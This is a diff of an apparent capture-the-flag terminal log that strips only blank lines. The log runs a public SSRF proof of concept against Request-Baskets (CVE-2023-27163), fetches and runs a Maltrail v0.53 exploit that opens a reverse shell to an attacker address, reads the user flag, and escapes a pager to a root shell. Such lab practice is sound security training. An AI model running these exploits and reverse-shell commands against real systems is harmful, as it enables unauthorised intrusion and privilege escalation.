@@ -71,7 +71,6 @@ CVE-2023-27163.sh                                          100%[================
 
 2025-06-30 09:12:21 (24.1 MB/s) - ‘CVE-2023-27163.sh’ saved [1669/1669]
 
-
 └─$ ./CVE-2023-27163.sh       
 Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at https://github.com/entr0pie/CVE-2023-27163
 
@@ -85,7 +84,6 @@ Arguments:
  TARGET         r-baskets target server (eg. https://b5f5-138-204-24-206.ngrok-free.app/)
 
 More info at https://github.com/entr0pie/CVE-2023-27163.
-
 
 └─$ ./CVE-2023-27163.sh http://10.129.229.26:55555 http://127.0.0.1:80
 Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at https://github.com/entr0pie/CVE-2023-27163
@@ -120,7 +118,6 @@ Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at htt
 ./CVE-2023-27163.sh: line 43: jq: command not found
 > Response body (Authorization): {"token":"8fGpaB2m8QH7NW0ne_6Rxd-l0B8LHvFtRjMoVpTutd5r"}
 
-
 └─$ wget https://raw.githubusercontent.com/spookier/Maltrail-v0.53-Exploit/refs/heads/main/exploit.py
 --2025-07-02 02:09:48--  https://raw.githubusercontent.com/spookier/Maltrail-v0.53-Exploit/refs/heads/main/exploit.py
 Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.108.133, 185.199.111.133, ...
@@ -132,7 +129,6 @@ Saving to: ‘exploit.py’
 exploit.py                                                 100%[========================================================================================================================================>]   2.15K  --.-KB/s    in 0s      
 
 2025-07-02 02:09:49 (25.3 MB/s) - ‘exploit.py’ saved [2200/2200]
-
 
 └─$ python3.13 exploit.py 10.10.16.4 4444 http://10.129.200.37:55555/tcrcqh
 Running exploit on http://10.129.200.37:55555/tcrcqh
@@ -146,7 +142,6 @@ connect to [10.10.16.4] from (UNKNOWN) [10.129.200.37] 44166
 $ id
 id
 uid=1001(puma) gid=1001(puma) groups=1001(puma)
-
 
 $ cat /home/puma/user.txt
 cat /home/puma/user.txt
@@ -201,7 +196,6 @@ lines 1-23!sh
 # id
 id
 uid=0(root) gid=0(root) groups=0(root)
-
 
 # cat /root/root.txt
 cat /root/root.txt
